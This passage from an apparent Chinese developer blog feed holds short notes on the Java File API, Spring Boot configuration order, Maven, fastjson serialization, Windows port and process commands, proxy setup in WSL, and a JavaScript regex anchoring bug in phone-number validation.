        <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p><code>java.io.File</code> 类是文件和目录路径名的抽象表示，主要用于文件和目录的创建、查找和删除等操作。</p><h2 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h2><ul><li><p>File(String pathname) 通过将给定路径名字符串转换为抽象路径名来创建一个新 File 实例</p><ul><li>参数：<br><code>String pathname</code>：字符串中的路径名称</li><li>路径可以是以文件结尾，也可以是以文件夹结尾<br>路径可以是相对路径，也可以是绝对路径</li><li>路径可以是存在，也可以是不存在<br>创建 File 对象，只是把字符串路径封装为 File 对象，不考虑路径的真假情况</li></ul></li><li><p><code>File(String parent, String child)</code> 根据 parent 路径名字符串和 child 路径名字符串创建一个新 File 实例</p><ul><li>参数：把路径分成了两部分<br><code>String parent</code>：父路径<br><code>String child</code>：子路径</li><li>好处：<br>父路径和子路径，可以单独书写，使用起来非常灵活；父路径和子路径都可以变化</li></ul></li><li><p><code>File(File parent, String child)</code> 根据父类抽象路径名和 child 路径名字符串创建一个新 File 实例</p><ul><li><p>参数：把路径分成了两部分</p><p><code>String parent</code>：父路径</p><p><code>String child</code>：子路径</p></li><li><p>好处：</p><p>父路径和子路径，可以单独书写，使用起来非常灵活；父路径和子路径都可以变化</p><p>父路径是 File 类型，可以使用 File 的方法对路径进行一些操作，再使用路径创建对象</p></li></ul></li></ul><h2 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h2><h2 id="获取功能的方法"><a href="#获取功能的方法" class="headerlink" title="获取功能的方法"></a>获取功能的方法</h2><ul><li><p><code>public String getAbsolutePath()</code> ：返回此 File 的绝对路径名字符串。</p></li><li><p><code>public String getPath()</code> ：将此 File 转换为路径名字符串。</p></li><li><p><code>public String getName()</code> ：返回由此 File 表示的文件或目录的名称。</p></li><li><p><code>public long length()</code> ：返回由此 File 表示的文件的长度。</p><p>获取的是构造方法指定的文件的大小，以字节为单位</p><p>注意：</p><ul><li>文件夹是没有大小的概念的，不能获取文件夹的大小</li><li>如果构造方法中给出的路径不存在，那么 length()方法返回 0</li></ul></li></ul><h2 id="判断功能的方法"><a href="#判断功能的方法" class="headerlink" title="判断功能的方法"></a>判断功能的方法</h2><ul><li><code>public boolean exists()</code> : 此 File 表示的文件或目录是否实际存在</li><li><code>public boolean isDirectory()</code> : 此 File 表示的是否为目录</li><li><code>public boolean isFile()</code> : 此 File 表示的是否是文件</li></ul><h2 id="创建删除功能的方法"><a href="#创建删除功能的方法" class="headerlink" title="创建删除功能的方法"></a>创建删除功能的方法</h2><ul><li><p><code>public boolean createNewFile()</code> ：当且仅当具有该名称的文件尚不存在时，创建一个新的空文件。</p><p>返回值：</p><ul><li>true：文件不存在，创建文件，返回 true</li><li>false：文件存在，不会创建，返回 false</li></ul><p>注意：</p><ul><li><p>此方法只能创建文件，不能创建文件夹</p></li><li><p>创建文件的路径必须存在，否则会抛出异常</p></li></ul></li><li><p>public boolean delete() ：删除由此 File 表示的文件或目录。</p><p>返回值：</p><ul><li><p>true：文件&#x2F;文件夹删除成功</p></li><li><p>false：文件夹中有内容，不会删除返回 false；路径不存在，返回 false</p></li></ul><p>注意：</p><ul><li>delete()方法是直接在硬盘删除文件&#x2F;文件夹，不走回收站</li></ul></li><li><p><code>public boolean mkdir()</code> ：创建由此 File 表示的目录。</p></li><li><p><code>public boolean mkdirs()</code> ：创建由此 File 表示的目录，包括任何必需但不存在的父目录。</p><p>返回值：</p><ul><li>true：文件夹不存在，创建文件夹返回 true</li><li>false：文件夹存在，不会创建，返回 false</li></ul><p>注意：</p><ul><li>此方法只能创建文件夹，不能创建文件</li></ul></li></ul><h2 id="遍历（文件夹）目录功能"><a href="#遍历（文件夹）目录功能" class="headerlink" title="遍历（文件夹）目录功能"></a>遍历（文件夹）目录功能</h2><ul><li><p><code>public String[] list()</code> : 返回一个 String 数组，表示该 File 目录中的所有子文件或目录</p></li><li><p><code>public File[] listFiles()</code> : 返回一个 File 数组，表示该 File 目录中的所有子文件或目录</p><p>注意：</p><p><code>list()</code>方法和<code>listFiles()</code>遍历的是构造方法中给出的目录</p><p>如果构造方法中给出的目录路径不存在（或者不是一个目录），会抛出空指针异常</p></li></ul><h2 id="文件过滤器"><a href="#文件过滤器" class="headerlink" title="文件过滤器"></a>文件过滤器</h2><p><code>java.io.FileFilter</code> 是一个接口，是 File 的过滤器。 该接口的对象可以传递给 File 类的 <code>listFiles(FileFilter)</code>作为参数。接口中只有一个方法：</p><p><code>boolean accept(File pathname)</code> ：测试 pathname 是否应该包含在当前 File 目录中，符合则返回 true。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>File类的getPath()方法的一个问题</title>
      <link href="/2022/10/06/File%E7%B1%BB%E7%9A%84getPath/"/>
      <url>/2022/10/06/File%E7%B1%BB%E7%9A%84getPath/</url>
      
        <content type="html"><![CDATA[<p>若创建的 File 对象是一个目录，那么它的 getPath()方法的返回值会默认去掉末尾的&#x2F;，这点在路径拼接时可能会导致出错。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">File</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span><span class="token punctuation">,</span> <span class="token class-name">Comparable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">File</span><span class="token punctuation">></span></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">getPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> path<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>若是要创建新的 File 文件对象的话，可以使用<code>public File(File parent, String child)</code>这个构造方法</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>springboot属性加载优先顺序</title>
      <link href="/2022/10/02/springboot%E5%B1%9E%E6%80%A7%E5%8A%A0%E8%BD%BD%E4%BC%98%E5%85%88%E9%A1%BA%E5%BA%8F/"/>
      <url>/2022/10/02/springboot%E5%B1%9E%E6%80%A7%E5%8A%A0%E8%BD%BD%E4%BC%98%E5%85%88%E9%A1%BA%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<blockquote><p>来源：<a href="https://docs.spring.io/spring-boot/docs/current/reference/html/features.html#features.external-config">spring.io</a> </p></blockquote><p>由上至下优先级依次提升（下方覆盖上方）</p><ol><li>Default properties (specified by setting <code>SpringApplication.setDefaultProperties</code>).</li><li><code>@PropertySource</code>annotations on your <code>@Configuration</code> classes. Please note that such property sources are not added to the <code>Environment</code> until the application context is being refreshed. This is too late to configure certain properties such as <code>logging.*</code> and <code>spring.main.*</code> which are read before refresh begins.</li><li>Config data (such as <code>application.properties</code> files).</li><li>A <code>RandomValuePropertySource</code> that has properties only in <code>random.*</code>.</li><li>OS environment variables.</li><li>Java System properties (<code>System.getProperties()</code>).</li><li>JNDI attributes from <code>java:comp/env</code>.</li><li><code>ServletContext</code> init parameters.</li><li><code>ServletConfig</code> init parameters.</li><li>Properties from <code>SPRING_APPLICATION_JSON</code> (inline JSON embedded in an environment variable or system property).</li><li>Command line arguments.</li><li><code>properties</code> attribute on your tests. Available on <code>@SpringBootTest</code>and the test annotations for testing a particular slice of your application.</li><li><code>@TestPropertySource</code> annotations on your tests.</li><li>Devtools global settings properties in the <code>$HOME/.config/spring-boot</code> directory when devtools is active.</li></ol><p>Config data files are considered in the following order:</p><ol><li>Application properties packaged inside your jar (<code>application.properties</code> and YAML variants).</li><li>Profile-specific application properties packaged inside your jar (<code>application-&#123;profile&#125;.properties</code> and YAML variants).</li><li>Application properties outside of your packaged jar (<code>application.properties</code> and YAML variants).</li><li>Profile-specific application properties outside of your packaged jar (<code>application-&#123;profile&#125;.properties</code> and YAML variants).</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>windows端口相关命令</title>
      <link href="/2022/10/02/windows%E7%AB%AF%E5%8F%A3%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/"/>
      <url>/2022/10/02/windows%E7%AB%AF%E5%8F%A3%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<ul><li><p>查询端口</p><p><code>netstat -ano</code></p></li><li><p>查询指定端口</p><p><code>netstat -ano |findstr ”端口号&quot;</code></p></li><li><p>根据进程PID查询进程名称</p></li></ul><p>  <code>tasklist |findstr &quot;进程PID号&quot;</code></p><ul><li><p>根据PID杀死任务</p><p><code>taskkill /F/PID &quot;进程PID号&quot;</code></p></li><li><p>根据进程名称杀死任务<br><code>taskkill -f -t -im &quot;进程名称&quot;</code></p></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>StringBuilder和StringBuffer</title>
      <link href="/2022/09/25/StringBuilder%E5%92%8CStringBuffer/"/>
      <url>/2022/09/25/StringBuilder%E5%92%8CStringBuffer/</url>
      
        <content type="html"><![CDATA[<ul><li>当对字符串进行修改的时候，需要使用 StringBuffer 和 StringBuilder 类。</li><li>和 String 类不同的是，StringBuffer 和 StringBuilder类的对象能够被多次的修改，并且不产生新的未使用对象。</li><li>StringBuilder 类在 Java 5 中被提出，它和 StringBuffer 之间的最大不同在于 StringBuilder 的方法不是线程安全的（不能同步访问）。</li><li>由于 StringBuilder 相较于 StringBuffer 有速度优势，多数情况下建议使用 StringBuilder类。然而在应用程序要求线程安全的情况下，则必须使用 StringBuffer 类。</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>maven</title>
      <link href="/2022/09/20/maven/"/>
      <url>/2022/09/20/maven/</url>
      
        <content type="html"><![CDATA[<h2 id="依赖管理"><a href="#依赖管理" class="headerlink" title="依赖管理"></a>依赖管理</h2><h3 id="依赖冲突问题"><a href="#依赖冲突问题" class="headerlink" title="依赖冲突问题"></a>依赖冲突问题</h3><ul><li>路径优先:当依赖中出现相同的资源时，层级越深，优先级越低，层级越浅，优先级越高</li><li>声明优先:当资源在相同层级被依赖时，配置顺序靠前的覆盖配置顺序靠后的</li><li>特殊优先:当同级配置了相同资源的不同版本，后配置的覆盖先配置的</li></ul><h3 id="可选依赖"><a href="#可选依赖" class="headerlink" title="可选依赖"></a>可选依赖</h3><p>对外隐藏当前所依赖的资源</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>optional</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>optional</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="排除依赖"><a href="#排除依赖" class="headerlink" title="排除依赖"></a>排除依赖</h3><p>主动断开依赖的资源（此处无需指定版本）</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>exclusions</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>exclusion</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>exclusion</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>exclusions</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="依赖范围"><a href="#依赖范围" class="headerlink" title="依赖范围"></a>依赖范围</h3><p>通过<code>&lt;scope&gt;</code>标签设置依赖的作用范围</p><ul><li>compile(default): 全局有效<code>log4j</code></li><li>test: 只在测试有效<code>junit</code></li><li>provided: 主程序和测试有效<code>servlet-api</code></li><li>runtime: 只在打包有效<code>jdbc</code></li></ul><h2 id="项目构建"><a href="#项目构建" class="headerlink" title="项目构建"></a>项目构建</h2><h3 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h3><ol><li>clean: 清理</li><li>default: 核心工作，例如编译，测试，打包，部署等</li><li>site: 产生报告，发布站点</li></ol><h3 id="聚合"><a href="#聚合" class="headerlink" title="聚合"></a>聚合</h3><ul><li><p>作用：用于快速构建 maven 工程，一次性构建多个项目&#x2F;模块。</p></li><li><p>制作方式：创建一个空模块,打包类型定义为 pom</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>packaging</span><span class="token punctuation">></span></span>pom<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>packaging</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>定义当前模块进行构建操作时关联的其他模块名称</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>modules</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>module</span><span class="token punctuation">></span></span>../ proj_controller<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>module</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>module</span><span class="token punctuation">></span></span>../proj_service<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>module</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>module</span><span class="token punctuation">></span></span>../proj_dao<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>module</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>module</span><span class="token punctuation">></span></span>../proj_pojo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>module</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>modules</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>注意事项:参与聚合操作的模块最终执行顺序与模块间的依赖关系有关，与配置顺序无关</p></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>fastjson关于属性is开头的序列化问题</title>
      <link href="/2022/09/20/fastjson%E5%85%B3%E4%BA%8E%E5%B1%9E%E6%80%A7is%E5%BC%80%E5%A4%B4%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E9%97%AE%E9%A2%98/"/>
      <url>/2022/09/20/fastjson%E5%85%B3%E4%BA%8E%E5%B1%9E%E6%80%A7is%E5%BC%80%E5%A4%B4%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Demo</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">Boolean</span> isHot<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Boolean</span> isQuick<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Boolean</span> <span class="token function">getHot</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> isHot<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setHot</span><span class="token punctuation">(</span><span class="token class-name">Boolean</span> hot<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        isHot <span class="token operator">=</span> hot<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">Boolean</span> <span class="token function">getQuick</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> isQuick<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setQuick</span><span class="token punctuation">(</span><span class="token class-name">Boolean</span> quick<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        isQuick <span class="token operator">=</span> quick<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如上面一个 bean，get&#x2F;set 方法均为 idea 自动生成的，Fastjson 序列化后的结果为</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"hot"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>  <span class="token property">"quick"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>我们其实期望的是</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"isHot"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>  <span class="token property">"isQuick"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><h3 id="方案一"><a href="#方案一" class="headerlink" title="方案一"></a>方案一</h3><p>修改 get 方法为<code>getIsXXX</code><br><code>public Boolean getHot()</code>-&gt;<code>public Boolean getIsHot()</code></p><h3 id="方案二"><a href="#方案二" class="headerlink" title="方案二"></a>方案二</h3><p>不要以 is 开头，加入公司的代码规范，《Java 开发手册（泰山版）》中也提到了</p><p>【强制】POJO 类中的任何布尔类型的变量，都不要加 is 前缀，否则部分框架解析会引起序列 化错误。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>try-catch-finally语句中有return的各类情况</title>
      <link href="/2022/09/17/try-catch-finally%E8%AF%AD%E5%8F%A5%E4%B8%AD%E6%9C%89return%E7%9A%84%E5%90%84%E7%B1%BB%E6%83%85%E5%86%B5/"/>
      <url>/2022/09/17/try-catch-finally%E8%AF%AD%E5%8F%A5%E4%B8%AD%E6%9C%89return%E7%9A%84%E5%90%84%E7%B1%BB%E6%83%85%E5%86%B5/</url>
      
        <content type="html"><![CDATA[<p> try语句在返回前，将其他所有的操作执行完，保留好要返回的值，而后转入执行finally中的语句，而后分为以下三种情况：</p><ul><li><p>情况一：如果finally中有return语句，则会将try中的return语句”覆盖“掉，直接执行finally中的return语句，得到返回值，这样便无法得到try之前保留好的返回值。</p></li><li><p>情况二：如果finally中没有return语句，也没有改变要返回值，则执行完finally中的语句后，会接着执行try中的return语句，返回之前保留的值。</p></li><li><p>情况三：如果finally中没有return语句，但是改变了要返回的值，这里有点类似与引用传递和值传递的区别，分以下两种情况，：</p><ol><li><p>如果return的数据是基本数据类型或文本字符串，则在finally中对该基本数据的改变不起作用，try中的return语句依然会返回进入finally块之前保留的值。</p></li><li><p>如果return的数据是引用数据类型，而在finally中对该引用数据类型的属性值的改变起作用，try中的return语句返回的就是在finally中改变后的该属性的值。</p></li></ol></li><li><p>情况四：当finally语句块中有return 语句时，并且在finally语句块外面还有return语句时，这个时候编译不通过，编译会出现错误（对于返回值为基本数据类型的情况。）。当try语句块儿中出现return语句时，执行完finally语句的时候便会执行try中的return语句，这个时候便不会在执行finally语句块儿后面的语句了（返回值是基本数据类型的时候是这样）当是引用类型的时候又会出现新的情况。（引用类型必须在catch语句中写return语句，）</p></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PowerShell 及 wsl中使用主机代理的方式</title>
      <link href="/2022/09/09/PowerShell-%E5%8F%8A-wsl%E4%B8%AD%E4%BD%BF%E7%94%A8%E4%B8%BB%E6%9C%BA%E4%BB%A3%E7%90%86%E7%9A%84%E6%96%B9%E5%BC%8F/"/>
      <url>/2022/09/09/PowerShell-%E5%8F%8A-wsl%E4%B8%AD%E4%BD%BF%E7%94%A8%E4%B8%BB%E6%9C%BA%E4%BB%A3%E7%90%86%E7%9A%84%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<p>软件：clash for windows</p><ol><li><p>首先在clash中开启 <code>Allow LAN</code>选项</p><p><img src="/2022/09/09/PowerShell-%E5%8F%8A-wsl%E4%B8%AD%E4%BD%BF%E7%94%A8%E4%B8%BB%E6%9C%BA%E4%BB%A3%E7%90%86%E7%9A%84%E6%96%B9%E5%BC%8F/1.png"></p></li><li><p>pwsh中使用 <code>$env:HTTP_PROXY=&quot;http://127.0.0.1:7890&quot;</code>设置环境变量</p><p><img src="/2022/09/09/PowerShell-%E5%8F%8A-wsl%E4%B8%AD%E4%BD%BF%E7%94%A8%E4%B8%BB%E6%9C%BA%E4%BB%A3%E7%90%86%E7%9A%84%E6%96%B9%E5%BC%8F/2.png"></p></li><li><p>wsl中使用 <code>export http_proxy=&quot;&#123;网关ip&#125;:7890&quot;</code></p><p><img src="/2022/09/09/PowerShell-%E5%8F%8A-wsl%E4%B8%AD%E4%BD%BF%E7%94%A8%E4%B8%BB%E6%9C%BA%E4%BB%A3%E7%90%86%E7%9A%84%E6%96%B9%E5%BC%8F/4.png"></p><blockquote><p>网关ip可以在主机中查看wsl的虚拟网络适配器的ipv4地址</p><p><img src="/2022/09/09/PowerShell-%E5%8F%8A-wsl%E4%B8%AD%E4%BD%BF%E7%94%A8%E4%B8%BB%E6%9C%BA%E4%BB%A3%E7%90%86%E7%9A%84%E6%96%B9%E5%BC%8F/3.png"></p></blockquote></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>js中正则表达式的关于^和$的问题</title>
      <link href="/2022/09/03/js%E4%B8%AD%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E4%B8%80%E4%B8%AA%E5%B0%8F%E9%97%AE%E9%A2%98/"/>
      <url>/2022/09/03/js%E4%B8%AD%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E4%B8%80%E4%B8%AA%E5%B0%8F%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>今天突然在数据库中发现这样一个手机号<code>1787878787878</code>,</p><p>可以发现，比正常的手机号多了两位，但是这些都是在前端通过正则校验的，</p><p>下面是前端用的正则，看起来似乎没有问题（早期版本，忽略它繁琐的写法，此处只讨论问题）</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^(13[0-9]&#123;9&#125;)|(15[0-9]&#123;9&#125;)|(17[0-9]&#123;9&#125;)|(18[0-9]&#123;9&#125;)|(19[0-9]&#123;9&#125;)$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>co 出来一段测试一番，问题很奇怪</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">regex1 <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^(17[0-9]&#123;9&#125;)$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">;</span>regex2 <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^(19[0-9]&#123;9&#125;)$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">;</span>regex3 <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^(17[0-9]&#123;9&#125;)|(19[0-9]&#123;9&#125;)$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>regex1<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">'1787878787878'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// false</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>regex2<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">'1787878787878'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// false</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>regex3<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">'1787878787878'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// true</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>regex3<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">'1987878787878'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// false</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong><code>^</code>表示开头，即被匹配的字符串只能以<code>^</code>后的字符开头</strong></p><p><strong><code>$</code>表示结尾，即被匹配的字符串只能以<code>$</code>前的字符结尾</strong></p><p><strong>如果同时使用<code>^</code>和<code>$</code>， 则要求字符串必须完全符合正则表达式</strong></p><p>所以上面的<code>regex3</code>中的<code>^</code>和<code>$</code>分别与左侧和右侧的分式结合了，只是代表着 17 开头或者以 9 个数字结尾的字符串，并不是完全匹配 11 个字符的长度。下面还有一个例子用来证明：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">regex4 <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^(17[0-9]&#123;9&#125;)|(18[0-9]&#123;9&#125;)|(19[0-9]&#123;9&#125;)$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>regex4<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">'a18888888888b'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>该表达式表明：第二个式子完全没有匹配字符串的开头和结尾。</p><p>不出所料，这样写就对了</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">regex5 <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">(^17[0-9]&#123;9&#125;$)|(^19[0-9]&#123;9&#125;$)</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>regex5<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token 